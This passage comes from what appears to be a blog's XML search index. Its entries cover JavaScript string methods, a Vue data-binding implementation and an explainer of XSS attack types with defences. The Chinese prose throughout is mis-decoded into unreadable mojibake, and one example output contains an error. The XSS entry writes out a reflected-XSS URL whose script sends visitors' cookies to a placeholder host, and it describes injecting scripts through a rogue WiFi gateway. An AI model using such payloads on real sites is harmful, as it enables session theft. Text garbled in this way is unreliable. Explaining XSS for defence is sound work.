æ€»ç»“ä¸€èˆ¬æ¥è¯´ï¼Œä¸ºäº†ä¾¿åˆ©æ€§ï¼Œå®‰å…¨æ€§ï¼Œé¿å…é‡å¤é€ è½®å­ï¼Œåœ¨å®žé™…å·¥ä½œä¸­éƒ½æ˜¯ç›´æŽ¥ç”¨ä¸€äº›å¼€æºç»„ç»‡ç¼–å†™çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ¯”å¦‚ueditor,umEditor,handEditorç­‰ï¼Œå½“ç„¶åº”ç”¨åœ¨ä¸€äº›åœºæ™¯ä¹Ÿæ˜¯éœ€è¦è‡ªå·±ç†è§£å’Œä¼šå†™ä¸€éƒ¨åˆ†åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨çº¿æ–‡æ¡£ã€‚]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript å¯Œæ–‡æœ¬</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŒºåˆ†substringã€substrå’Œslice]]></title>
    <url>%2F2017%2F11%2F08%2F%E5%8C%BA%E5%88%86substring%E3%80%81substr%E5%92%8Cslice%2F</url>
    <content type="text"><![CDATA[å‚æ•°ä¸ºæ­£æ•°çš„æƒ…å†µslice()å’Œsubstring()çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šçš„æ˜¯å­—ç¬¦ä¸²æœ€åŽä¸€ä¸ªå­—ç¬¦åŽé¢çš„ä½ç½®ï¼Œè€Œsubstr()çš„ç¬¬äºŒä¸ªæ“¦è¾“æŒ‡å®šçš„åˆ™æ˜¯è¿”å›žçš„å­—ç¬¦ä¸²ä¸ªæ•°ã€‚ 12345678var stringValue = &quot;hello world&quot;;console.log(stringValue.slice(3)); // &quot;lo world&quot;console.log(stringValue.substring(3)); // &quot;lo world&quot;console.log(stringValue.substr(3)); // &quot;lo world&quot;console.log(stringValue.slice(3, 7)); // &quot;lo w&quot;console.log(stringValue.substring(3, 7)); // &quot;lo w&quot;console.log(stringValue.substr(3, 7)); // &quot;lo worl&quot; å‚æ•°æœ‰è´Ÿæ•°çš„æƒ…å†µslice()æ–¹æ³•ä¼šå°†ä¼ å…¥çš„è´Ÿæ•°ä¸Žå­—ç¬¦ä¸²çš„é•¿åº¦ç›¸åŠ ï¼Œsubstr()æ–¹æ³•å°†è´Ÿçš„ç¬¬ä¸€ä¸ªå‚æ•°åŠ ä¸Šå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œå°†è´Ÿçš„ç¬¬äºŒä¸ªå‚æ•°è½¬åŒ–ä¸º0ã€‚æœ€åŽï¼Œsubstring()æ–¹æ³•ä¼šæŠŠæ‰€æœ‰è´Ÿå€¼å‚æ•°éƒ½è½¬åŒ–ä¸º0ã€‚ 12345678var stringValue = &quot;hello world&quot;;console.log(stringValue.slice( -3 )); // &quot;rld&quot;console.log(stringValue.substring( -3 )); // &quot;hellow world&quot;console.log(stringValue.substr( -3 )); // &quot;rld&quot;console.log(stringValue.slice( 3, -4 )); // &quot;lo w&quot;console.log(stringValue.substring( 3, -4 )); // &quot;hel&quot;console.log(stringValue.substr( 3, -4 )); // &quot;&quot;]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xssæ”»å‡»]]></title>
    <url>%2F2017%2F10%2F17%2Fxss%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[XSSï¼ˆcross-site scripting è·¨åŸŸè„šæœ¬æ”»å‡»ï¼‰æ”»å‡»æ˜¯æœ€å¸¸è§çš„ web æ”»å‡»ï¼Œå…¶é‡ç‚¹æ˜¯â€œè·¨åŸŸâ€å’Œâ€œå®¢æˆ·ç«¯æ‰§è¡Œâ€ã€‚XSS æ”»å‡»åˆ†ä¸ºä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯ï¼š Reflected XSSï¼ˆåŸºäºŽåå°„çš„ XSS æ”»å‡»ï¼‰ Stored XSSï¼ˆåŸºäºŽå­˜å‚¨çš„ XSS æ”»å‡»ï¼‰ DOM-based or local XSSï¼ˆåŸºäºŽ DOM æˆ–æœ¬åœ°çš„ XSS æ”»å‡»ï¼‰ 1ã€Reflected XSSåŸºäºŽåå°„çš„ XSS æ”»å‡»ï¼Œä¸»è¦ä¾é ç«™ç‚¹æœåŠ¡ç«¯è¿”å›žè„šæœ¬ï¼Œå†å®¢æˆ·ç«¯è§¦å‘æ‰§è¡Œä»Žè€Œå‘èµ· Web æ”»å‡»ã€‚ ä¾‹å­ 1ã€åšä¸ªå‡è®¾ï¼Œå½“äºšé©¬é€Šåœ¨æœç´¢ä¹¦ç±ï¼Œæœä¸åˆ°ä¹¦çš„æ—¶å€™æ˜¾ç¤ºæäº¤çš„åç§°ã€‚ 2ã€åœ¨æœç´¢æ¡†æœç´¢å†…å®¹ï¼Œå¡«å…¥â€œalert(â€˜handsome boyâ€™)â€, ç‚¹å‡»æœç´¢ã€‚ 3ã€å½“å‰ç«¯é¡µé¢æ²¡æœ‰å¯¹è¿”å›žçš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œç›´æŽ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œè¿™æ—¶å°±ä¼š alert é‚£ä¸ªå­—ç¬¦ä¸²å‡ºæ¥ã€‚ 4ã€è¿›è€Œå¯ä»¥æž„é€ èŽ·å–ç”¨æˆ· cookies çš„åœ°å€ï¼Œé€šè¿‡ QQ ç¾¤æˆ–è€…åžƒåœ¾é‚®ä»¶ï¼Œæ¥è®©å…¶ä»–äººç‚¹å‡»è¿™ä¸ªåœ°å€ï¼š 1http://www.amazon.cn/search?name=&lt;script&gt;document.location=&apos;http://xxx/get?cookie=&apos;+document.cookie&lt;/script&gt; å®‰å…¨æŽªæ–½ å‰ç«¯åœ¨æ˜¾ç¤ºæœåŠ¡ç«¯æ•°æ®æ—¶å€™ï¼Œä¸ä»…æ˜¯æ ‡ç­¾å†…å®¹éœ€è¦è¿‡æ»¤ã€è½¬ä¹‰ï¼Œå°±è¿žå±žæ€§å€¼ä¹Ÿéƒ½å¯èƒ½éœ€è¦ã€‚ åŽç«¯æŽ¥æ”¶è¯·æ±‚æ—¶ï¼ŒéªŒè¯è¯·æ±‚æ˜¯å¦ä¸ºæ”»å‡»è¯·æ±‚ï¼Œæ”»å‡»åˆ™å±è”½ã€‚ 2ã€Stored XSSåŸºäºŽå­˜å‚¨çš„ XSS æ”»å‡»ï¼Œæ˜¯é€šè¿‡å‘è¡¨å¸¦æœ‰æ¶æ„è·¨åŸŸè„šæœ¬çš„å¸–å­/æ–‡ç« ï¼Œä»Žè€ŒæŠŠæ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œæ¯ä¸ªè®¿é—®è¯¥å¸–å­/æ–‡ç« çš„äººå°±ä¼šè§¦å‘æ‰§è¡Œã€‚ ä¾‹å­ å‘ä¸€ç¯‡æ–‡ç« ï¼Œé‡Œé¢åŒ…å«äº†æ¶æ„è„šæœ¬ 1ä»Šå¤©å¤©æ°”ä¸é”™å•Šï¼&lt;script&gt;alert(&apos;handsome boy&apos;)&lt;/script&gt; åŽç«¯æ²¡æœ‰å¯¹æ–‡ç« è¿›è¡Œè¿‡æ»¤ï¼Œç›´æŽ¥ä¿å­˜æ–‡ç« å†…å®¹åˆ°æ•°æ®åº“ã€‚ å½“å…¶ä»–çœ‹è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼ŒåŒ…å«çš„æ¶æ„è„šæœ¬å°±ä¼šæ‰§è¡Œã€‚ å®‰å…¨æŽªæ–½ é¦–è¦æ˜¯æœåŠ¡ç«¯è¦è¿›è¡Œè¿‡æ»¤ï¼Œå› ä¸ºå‰ç«¯çš„æ ¡éªŒå¯ä»¥è¢«ç»•è¿‡ã€‚ å½“æœåŠ¡ç«¯ä¸æ ¡éªŒæ—¶å€™ï¼Œå‰ç«¯è¦ä»¥å„ç§æ–¹å¼è¿‡æ»¤é‡Œé¢å¯èƒ½çš„æ¶æ„è„šæœ¬ï¼Œä¾‹å¦‚ script æ ‡ç­¾ï¼Œå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢æˆ HTML ç¼–ç ã€‚ 3ã€DOM-based or local XSSåŸºäºŽ DOM æˆ–æœ¬åœ°çš„ XSS æ”»å‡»ã€‚ä¸€èˆ¬æ˜¯æä¾›ä¸€ä¸ªå…è´¹çš„ wifiï¼Œä½†æ˜¯æä¾›å…è´¹ wifi çš„ç½‘å…³ä¼šå¾€ä½ è®¿é—®çš„ä»»ä½•é¡µé¢æ’å…¥ä¸€æ®µè„šæœ¬æˆ–è€…æ˜¯ç›´æŽ¥è¿”å›žä¸€ä¸ªé’“é±¼é¡µé¢ï¼Œä»Žè€Œæ¤å…¥æ¶æ„è„šæœ¬ã€‚è¿™ç§ç›´æŽ¥å­˜åœ¨äºŽé¡µé¢ï¼Œæ— é¡»ç»è¿‡æœåŠ¡å™¨è¿”å›žå°±æ˜¯åŸºäºŽæœ¬åœ°çš„ XSS æ”»å‡»ã€‚ ä¾‹å­ æä¾›ä¸€ä¸ªå…è´¹çš„ wifiã€‚ å¼€å¯ä¸€ä¸ªç‰¹æ®Šçš„ DNS æœåŠ¡ï¼Œå°†æ‰€æœ‰åŸŸåéƒ½è§£æžåˆ°æˆ‘ä»¬çš„ç”µè„‘ä¸Šï¼Œå¹¶æŠŠ Wifi çš„ DHCP-DNS è®¾ç½®ä¸ºæˆ‘ä»¬çš„ç”µè„‘ IPã€‚ ä¹‹åŽè¿žä¸Š wifi çš„ç”¨æˆ·æ‰“å¼€ä»»ä½•ç½‘ç«™ï¼Œè¯·æ±‚éƒ½å°†è¢«æˆ‘ä»¬æˆªå–åˆ°ã€‚æˆ‘ä»¬æ ¹æ® http å¤´ä¸­çš„ host å­—æ®µæ¥è½¬å‘åˆ°çœŸæ­£æœåŠ¡å™¨ä¸Šã€‚ æ”¶åˆ°æœåŠ¡å™¨è¿”å›žçš„æ•°æ®ä¹‹åŽï¼Œæˆ‘ä»¬å°±å¯ä»¥å®žçŽ°ç½‘é¡µè„šæœ¬çš„æ³¨å…¥ï¼Œå¹¶è¿”å›žç»™ç”¨æˆ·ã€‚ å½“æ³¨å…¥çš„è„šæœ¬è¢«æ‰§è¡Œï¼Œç”¨æˆ·çš„æµè§ˆå™¨å°†ä¾æ¬¡é¢„åŠ è½½å„å¤§ç½‘ç«™çš„å¸¸ç”¨è„šæœ¬åº“ã€‚ å®‰å…¨æŽªæ–½ä½¿ç”¨ HTTPS! xsshunterXSpearXSStrike]]></content>
      <categories>
        <category>å…¶å®ƒ</category>
      </categories>
      <tags>
        <tag>å®‰å…¨</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vueçš„æ•°æ®é©±åŠ¨åŽŸç†åŠç®€å•å®žçŽ°]]></title>
    <url>%2F2017%2F09%2F10%2Fvue%E7%9A%84%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[1ã€ç›®æ ‡å®žçŽ° ç†è§£åŒå‘æ•°æ®ç»‘å®šåŽŸç†ï¼› å®žçŽ° &#123;&#123; &#125;&#125;ã€v-modelå’ŒåŸºæœ¬äº‹ä»¶æŒ‡ä»¤v-bindï¼ˆ:ï¼‰ã€v-onï¼ˆ@ï¼‰ï¼› æ–°å¢žå±žæ€§çš„åŒå‘ç»‘å®šå¤„ç†ï¼› 2ã€åŒå‘æ•°æ®ç»‘å®šåŽŸç†vueå®žçŽ°å¯¹æ•°æ®çš„åŒå‘ç»‘å®šï¼Œé€šè¿‡å¯¹æ•°æ®åŠ«æŒç»“åˆå‘å¸ƒè€…-è®¢é˜…è€…æ¨¡å¼å®žçŽ°çš„ã€‚ 2.1 Object.definePropertyvueé€šè¿‡Object.definePropertyæ¥å®žçŽ°æ•°æ®åŠ«æŒï¼Œä¼šå¯¹æ•°æ®å¯¹è±¡æ¯ä¸ªå±žæ€§æ·»åŠ å¯¹åº”çš„getå’Œsetæ–¹æ³•ï¼Œå¯¹æ•°æ®è¿›è¡Œè¯»å–å’Œèµ‹å€¼æ“ä½œå°±åˆ†åˆ«è°ƒç”¨getå’Œsetæ–¹æ³•ã€‚ 1234567891011121314Object.defineProperty(data, key, &#123; enumerable: true, configurable: true, get: function() &#123; // do something return val; &#125;, set: function(newVal) &#123; // do something &#125;&#125;); æˆ‘ä»¬å¯ä»¥å°†ä¸€äº›æ–¹æ³•æ”¾åˆ°é‡Œé¢ï¼Œä»Žè€Œå®Œæˆå¯¹æ•°æ®çš„ç›‘å¬ï¼ˆåŠ«æŒï¼‰å’Œè§†å›¾çš„åŒæ­¥æ›´æ–°ã€‚ 2.2 è¿‡ç¨‹è¯´æ˜Žå®žçŽ°åŒå‘æ•°æ®ç»‘å®šï¼Œé¦–å…ˆè¦å¯¹æ•°æ®è¿›è¡Œæ•°æ®ç›‘å¬ï¼Œéœ€è¦ä¸€ä¸ªç›‘å¬å™¨Observerï¼Œç›‘å¬æ‰€æœ‰å±žæ€§ã€‚å¦‚æžœå±žæ€§å‘ç”Ÿå˜åŒ–ï¼Œä¼šè°ƒç”¨setterå’Œgetterï¼Œå†åŽ»å‘Šè¯‰è®¢é˜…è€…Watcheræ˜¯å¦éœ€è¦æ›´æ–°ã€‚ç”±äºŽè®¢é˜…è€…æœ‰å¾ˆå¤šä¸ªï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¶ˆæ¯è®¢é˜…å™¨Depæ¥ä¸“é—¨æ”¶é›†è¿™äº›è®¢é˜…è€…ï¼Œç„¶åŽåœ¨ç›‘å¬å™¨Observerå’Œè®¢é˜…è€…Watcherä¹‹é—´è¿›è¡Œç»Ÿä¸€ç®¡ç†ã€‚è¿˜æœ‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŒ‡ä»¤è§£æžå™¨Complieï¼Œå¯¹æ¯ä¸ªå…ƒç´ è¿›è¡Œæ‰«æå’Œè§£æžï¼Œå°†ç›¸å…³æŒ‡ä»¤å¯¹åº”åˆå§‹åŒ–æˆä¸€ä¸ªè®¢é˜…è€…Watcherï¼Œå¹¶æ›¿æ¢æ¨¡æ¿æ•°æ®æˆ–ç»‘å®šç›¸åº”å‡½æ•°ã€‚å½“è®¢é˜…è€…WatcheræŽ¥æ”¶åˆ°ç›¸åº”å±žæ€§çš„å˜åŒ–ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„æ›´æ–°å‡½æ•°ï¼Œä»Žè€Œæ›´æ–°è§†å›¾ã€‚ 3ã€å®žçŽ°ObserverObserveræ˜¯ä¸€ä¸ªæ•°æ®ç›‘å¬å™¨ï¼Œæ ¸å¿ƒæ–¹æ³•æ˜¯æˆ‘ä»¬æåˆ°è¿‡çš„Object.definePropertyã€‚å¦‚æžœè¦ç›‘å¬æ‰€æœ‰å±žæ€§çš„è¯ï¼Œåˆ™éœ€è¦é€šè¿‡é€’å½’éåŽ†ï¼Œå¯¹æ¯ä¸ªå­å±žæ€§éƒ½definePropertyã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/** * ç›‘å¬å™¨æž„é€ å‡½æ•° * @param &#123;Object&#125; data è¢«ç›‘å¬æ•°æ® */function Observer(data) &#123; if (!data || typeof data !== "object") &#123; return; &#125; this.data = data; this.walk(data);&#125;Observer.prototype = &#123; /** * å±žæ€§éåŽ† */ walk: function(data) &#123; var self = this; Object.keys(data).forEach(function(key) &#123; self.defineReactive(data, key, data[key]); &#125;); &#125;, /** * ç›‘å¬å‡½æ•° */ defineReactive: function(data, key, val) &#123; observe(val); Object.defineProperty(data, key, &#123; enumerable: true, configurable: true, get: function() &#123; return val; &#125;, set: function(newVal) &#123; if (newVal === val) &#123; return; &#125; val = newVal; console.log("å±žæ€§ï¼š" + key + "è¢«ç›‘å¬äº†ï¼ŒçŽ°åœ¨å€¼ä¸ºï¼š" + newVal); updateView(newVal); &#125; &#125;); updateView(val); &#125;&#125;/** * ç›‘å¬å™¨ * @param &#123;Object&#125; data è¢«ç›‘å¬å¯¹è±¡ */function observe(data) &#123; return new Observer(data);&#125;/** * vueæž„é€ å‡½æ•° * @param &#123;Object&#125; options æ‰€æœ‰å…¥å‚ */function MyVue(options) &#123; this.vm = this; this.data = options.data; // ç›‘å¬æ•°æ® observe(this.data); return this;&#125;/** * æ›´æ–°è§†å›¾ * @param &#123;*&#125; val */function updateView(val) &#123; var $name = document.querySelector("#name"); $name.innerHTML = val;&#125;var myvm = new MyVue(&#123; el: "#demo", data: &#123; name: "hello word" &#125;&#125;); 4ã€å®žçŽ°Depåœ¨æµç¨‹ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªå¯ä»¥è®¢é˜…è€…çš„è®¢é˜…å™¨Depï¼Œä¸»è¦è´Ÿè´£æ‰‹æœºè®¢é˜…è€…ï¼Œå±žæ€§å˜åŒ–çš„æ—¶å€™æ‰§è¡Œç›¸åº”çš„è®¢é˜…è€…ï¼Œæ›´æ–°å‡½æ•°ã€‚ä¸‹é¢ç¨åŠ æ”¹é€ Observerï¼Œå°±å¯ä»¥æ’å…¥æˆ‘ä»¬çš„è®¢é˜…å™¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182Observer.prototype = &#123; // ... /** * ç›‘å¬å‡½æ•° */ defineReactive: function(data, key, val) &#123; var dep = new Dep(); observe(val); Object.defineProperty(data, key, &#123; enumerable: true, configurable: true, get: function() &#123; // åˆ¤æ–­æ˜¯å¦éœ€è¦æ·»åŠ è®¢é˜…è€… ä»€ä¹ˆæ—¶å€™æ·»åŠ è®¢é˜…è€…å‘¢ï¼Ÿ ä¸Žå®žé™…é¡µé¢DOMæœ‰å…³è”çš„dataå±žæ€§æ‰æ·»åŠ ç›¸åº”çš„è®¢é˜…è€… if (Dep.target) &#123; // æ·»åŠ ä¸€ä¸ªè®¢é˜…è€… dep.addSub(Dep.target); &#125; return val; &#125;, set: function(newVal) &#123; if (newVal === val) &#123; return; &#125; val = newVal; console.log("å±žæ€§ï¼š" + key + "è¢«ç›‘å¬äº†ï¼ŒçŽ°åœ¨å€¼ä¸ºï¼š" + newVal); // é€šçŸ¥æ‰€æœ‰è®¢é˜…è€… dep.notify(newVal); &#125; &#125;); updateView(val); // è®¢é˜…å™¨æ ‡è¯†æœ¬èº«å®žä¾‹ Dep.target = dep; // å¼ºè¡Œæ‰§è¡Œgetterï¼Œå¾€è®¢é˜…å™¨ä¸­æ·»åŠ è®¢é˜…è€… var v = data[key]; // é‡Šæ”¾è‡ªå·± Dep.target = null; &#125;&#125;/** * ç›‘å¬å™¨ * @param &#123;Object&#125; data è¢«ç›‘å¬å¯¹è±¡ */function observe(data) &#123; return new Observer(data);&#125;/** * è®¢é˜…å™¨ */function Dep() &#123; this.subs = []; this.target = null;&#125;Dep.prototype = &#123; addSub: function(sub) &#123; this.subs.push(sub); console.log("this.subs:", this.subs); &#125;, notify: function(data) &#123; this.subs.forEach(function(sub) &#123; sub.update(data); &#125;); &#125;, update: function(val) &#123; updateView(val) &#125;&#125;;// ... PS:å°†è®¢é˜…å™¨Depæ·»åŠ åˆ°ä¸€ä¸ªè®¢é˜…è€…è®¾è®¡åˆ°getteré‡Œé¢ï¼Œæ˜¯ä¸ºäº†è®©Watcheråˆå§‹åŒ–è¿›è¡Œè§¦å‘ã€‚ 5ã€å®žçŽ°Watcherè®¢é˜…è€…Watcheråœ¨åˆå§‹åŒ–çš„æ—¶å€™éœ€è¦å°†è‡ªå·±æ·»åŠ åˆ°è®¢é˜…å™¨Depä¸­ï¼Œé‚£è¯¥å¦‚ä½•æ·»åŠ å‘¢ï¼Ÿæˆ‘ä»¬å·²ç»çŸ¥é“ç›‘å¬å™¨Observeræ˜¯åœ¨getå‡½æ•°æ‰§è¡Œæ·»åŠ äº†è®¢é˜…è€…Watcherçš„æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨è®¢é˜…è€…Watcheråˆå§‹åŒ–çš„æ—¶å€™è§¦å‘å¯¹åº”çš„getå‡½æ•°åŽ»æ‰§è¡Œæ·»åŠ è®¢é˜…è€…æ“ä½œã€‚é‚£ä¹ˆï¼Œæ€Žæ ·åŽ»è§¦å‘getå‡½æ•°ï¼Ÿå¾ˆç®€å•ï¼Œåªéœ€èŽ·å–å¯¹åº”çš„å±žæ€§å€¼å°±å¯ä»¥è§¦å‘äº†ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ç”¨Object.definePropertyç›‘å¬äº†æ‰€æœ‰å±žæ€§ã€‚vueåœ¨è¿™é‡Œåšäº†ä¸ªæŠ€å·§å¤„ç†ï¼Œå°±æ˜¯å’‹æˆ‘ä»¬æ·»åŠ è®¢é˜…è€…çš„æ—¶å€™ï¼Œåšä¸€ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯äº‹å…ˆç¼“å­˜å¥½çš„Dep.targetï¼Œåœ¨è®¢é˜…è€…æ·»åŠ æˆåŠŸåŽï¼ŒæŠŠtargeté‡ç½®nullå³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// .../** * è®¢é˜…è€… * @param &#123;Object&#125; vm vueå¯¹è±¡ * @param &#123;String&#125; exp å±žæ€§å€¼ * @param &#123;Function&#125; cb å›žè°ƒå‡½æ•° */function Watcher(vm, exp, cb) &#123; this.vm = vm; this.exp = exp; this.cb = cb; // å°†è‡ªå·±æ·»åŠ åˆ°è®¢é˜…å™¨ this.value = this.get();&#125;Watcher.prototype = &#123; update: function() &#123; this.run(); &#125;, run: function() &#123; var value = this.vm.data[this.exp]; var oldVal = this.value; if (value !== oldVal) &#123; this.value = value; this.cb.call(this.vm, value, oldVal); &#125; &#125;, get: function() &#123; // ç¼“å­˜è‡ªå·± åšä¸ªæ ‡è®° Dep.target = this; // å¼ºåˆ¶æ‰§è¡Œç›‘å¬å™¨é‡Œçš„getå‡½æ•° // this.vm.data[this.exp] è°ƒç”¨getterï¼Œæ·»åŠ ä¸€ä¸ªè®¢é˜…è€…subï¼Œå­˜å…¥åˆ°å…¨å±€å˜é‡subs var value = this.vm.data[this.exp]; // é‡Šæ”¾è‡ªå·± Dep.target = null; return value; &#125;&#125;;/** * vueæž„é€ å‡½æ•° * @param &#123;Object&#125; options æ‰€æœ‰å…¥å‚ */function MyVue(options) &#123; this.vm = this; this.data = options.data; observe(this.data); var $name = document.querySelector("#name"); // ç»™nameå±žæ€§æ·»åŠ ä¸€ä¸ªè®¢é˜…è€…åˆ°è®¢é˜…å™¨ä¸­ï¼Œå½“å±žæ€§å‘ç”Ÿå˜åŒ–åŽï¼Œè§¦å‘å›žè°ƒ var w = new Watcher(this, "name", function(val) &#123; $name.innerHTML = val; &#125;); return this;&#125; åˆ°è¿™é‡Œï¼Œå…¶å®žå·²ç»å®žçŽ°äº†æˆ‘ä»¬çš„åŒå‘æ•°æ®ç»‘å®šï¼šèƒ½å¤Ÿæ ¹æ®åˆå§‹æ•°æ®åˆå§‹åŒ–é¡µé¢ç‰¹å®šå…ƒç´ ï¼ŒåŒæ—¶å½“æ•°æ®æ”¹å˜ä¹Ÿèƒ½æ›´æ–°è§†å›¾ã€‚ 5ã€å®žçŽ°Compileæ­¥éª¤4æ•´ä¸ªè¿‡ç¨‹éƒ½èƒ½æœ‰åŽ»è§£æžDOMèŠ‚ç‚¹ï¼Œè€Œæ˜¯ç›´æŽ¥å›ºå®šèŠ‚ç‚¹è¿›è¡Œæ›¿æ¢ã€‚æŽ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥å®žçŽ°ä¸€ä¸ªè§£æžå™¨ï¼Œå®Œæˆä¸€äº›è§£æžå’Œç»‘å®šå·¥ä½œã€‚ èŽ·å–é¡µé¢çš„DOMèŠ‚ç‚¹ï¼ŒéåŽ†å­˜å…¥åˆ°æ–‡æ¡£ç¢Žç‰‡å¯¹è±¡ä¸­ï¼› è§£æžå‡ºæ–‡æœ¬èŠ‚ç‚¹ï¼ŒåŒ¹é…&#123;&#123;&#125;&#125;ï¼ˆæš‚æ—¶åªåšâ€&#123;&#123;&#125;&#125;â€çš„è§£æžï¼‰ï¼Œç”¨åˆå§‹åŒ–æ•°æ®æ›¿æ¢ï¼Œå¹¶æ·»åŠ ç›¸åº”è®¢é˜…è€…ï¼› åˆ†ç¦»å‡ºèŠ‚ç‚¹çš„æŒ‡ä»¤v-onã€v-bindå’Œv-modelï¼Œç»‘å®šç›¸åº”çš„äº‹ä»¶å’Œå‡½æ•°ï¼› 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262// .../** * ç¼–è¯‘å™¨æž„é€ å‡½æ•° * @param &#123;String&#125; el æ ¹å…ƒç´  * @param &#123;Object&#125; vm vueå¯¹è±¡ */function Compile(el, vm) &#123; this.vm = vm; this.el = document.querySelector(el); this.fragment = null; this.init();&#125;Compile.prototype = &#123; /** * åˆå§‹ */ init: function() &#123; if (this.el) &#123; console.log("this.el:", this.el); // ç§»é™¤é¡µé¢å…ƒç´ ç”Ÿæˆæ–‡æ¡£ç¢Žç‰‡ this.fragment = this.nodeToFragment(this.el); // ç¼–è¯‘æ–‡æ¡£ç¢Žç‰‡ this.compileElement(this.fragment); this.el.appendChild(this.fragment); &#125; else &#123; console.log("DOM Selector is not exist"); &#125; &#125;, /** * é¡µé¢DOMèŠ‚ç‚¹è½¬åŒ–æˆæ–‡æ¡£ç¢Žç‰‡ */ nodeToFragment: function(el) &#123; var fragment = document.createDocumentFragment(); var child = el.firstChild; // æ­¤å¤„æ·»åŠ æ‰“å°ï¼Œå‡ºæ¥çš„ä¸æ˜¯é¡µé¢ä¸­åŽŸå§‹çš„DOMï¼Œè€Œæ˜¯ç¼–è¯‘åŽçš„ï¼Ÿ // NodeListæ˜¯å¼•ç”¨å…³ç³»ï¼Œåœ¨ç¼–è¯‘åŽç›¸åº”çš„å€¼è¢«æ›¿æ¢äº†ï¼Œè¿™é‡Œæ‰“å°å‡ºæ¥çš„NodeListæ˜¯åŽæ¥è¢«å¼•ç”¨æ›´æ–°äº†çš„ console.log("el:", el); // console.log("el.firstChild:", el.firstChild.nodeValue); while (child) &#123; // appendåŽï¼ŒåŽŸelä¸Šçš„å­èŠ‚ç‚¹è¢«åˆ é™¤äº†ï¼ŒæŒ‚è½½åœ¨æ–‡æ¡£ç¢Žç‰‡ä¸Š fragment.appendChild(child); child = el.firstChild; &#125; return fragment; &#125;, /** * ç¼–è¯‘æ–‡æ¡£ç¢Žç‰‡ï¼ŒéåŽ†åˆ°å½“å‰æ˜¯æ–‡æœ¬èŠ‚ç‚¹åˆ™åŽ»ç¼–è¯‘æ–‡æœ¬èŠ‚ç‚¹ï¼Œå¦‚æžœå½“å‰æ˜¯å…ƒç´ èŠ‚ç‚¹ï¼Œå¹¶ä¸”å­˜åœ¨å­èŠ‚ç‚¹ï¼Œåˆ™ç»§ç»­é€’å½’éåŽ† */ compileElement: function(fragment) &#123; var childNodes = fragment.childNodes; var self = this; [].slice.call(childNodes).forEach(function(node) &#123; // var reg = /\&#123;\&#123;\s*(.+)\s*\&#125;\&#125;/g; var reg = /\&#123;\&#123;\s*((?:.|\n)+?)\s*\&#125;\&#125;/g; var text = node.textContent; if (self.isElementNode(node)) &#123; self.compileAttr(node); &#125; else if (self.isTextNode(node) &amp;&amp; reg.test(text)) &#123; reg.lastIndex = 0 /* var match; while(match = reg.exec(text)) &#123; self.compileText(node, match[1]); &#125; */ self.compileText(node, reg.exec(text)[1]); &#125; if (node.childNodes &amp;&amp; node.childNodes.length) &#123; self.compileElement(node); &#125; &#125;); &#125;, /** * ç¼–è¯‘å±žæ€§ */ compileAttr: function(node) &#123; var nodeAttrs = node.attributes; var self = this; Array.prototype.forEach.call(nodeAttrs, function(attr) &#123; var attrName = attr.name; // åªå¯¹vueæœ¬èº«æŒ‡ä»¤è¿›è¡Œæ“ä½œ if (self.isDirective(attrName)) &#123; var exp = attr.value; // v-onæŒ‡ä»¤ if (self.isOnDirective(attrName)) &#123; self.compileOn(node, self.vm, exp, attrName); &#125; // v-bindæŒ‡ä»¤ if(self.isBindDirective(attrName)) &#123; self.compileBind(node, self.vm, exp, attrName); &#125; // v-model else if (self.isModelDirective(attrName)) &#123; self.compileModel(node, self.vm, exp, attrName); &#125; node.removeAttribute(attrName); &#125; &#125;) &#125;, /** * ç¼–è¯‘æ–‡æ¡£ç¢Žç‰‡èŠ‚ç‚¹æ–‡æœ¬ï¼Œå³å¯¹æ ‡è®°æ›¿æ¢ */ compileText: function(node, exp) &#123; var self = this; var exps = exp.split("."); var initText = this.vm.data[exp]; // åˆå§‹åŒ–è§†å›¾ this.updateText(node, initText); // æ·»åŠ ä¸€ä¸ªè®¢é˜…è€…åˆ°è®¢é˜…å™¨ var w = new Watcher(this.vm, exp, function(val) &#123; self.updateText(node, val); &#125;); &#125;, /** * ç¼–è¯‘v-onæŒ‡ä»¤ 